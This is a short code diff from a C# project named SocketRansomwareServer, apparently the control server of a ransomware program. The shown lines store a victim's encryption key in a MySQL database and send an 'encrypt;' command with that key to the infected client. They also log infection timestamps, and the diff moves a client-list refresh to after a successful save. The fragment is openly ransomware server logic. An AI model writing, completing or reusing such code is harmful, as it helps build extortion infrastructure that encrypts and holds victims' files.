@@ -129,14 +129,14 @@ namespace SocketRansomwareServer
                         Console.WriteLine(key);
                         command = new MySqlCommand(insertQuery, DB.Instance._connection);
 
-                        getClientsDB();
+                        
 
                         if (command.ExecuteNonQuery() == 1)
                         {
                             Console.WriteLine("DB 저장 성공");
                             SendDataClient("encrypt;" + key);
                             SendDataClient("timestamp;infection;" + start_date + ";current;" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
-
+                            getClientsDB();
                         }
                         else Console.WriteLine("DB 저장 실패");
                         // }
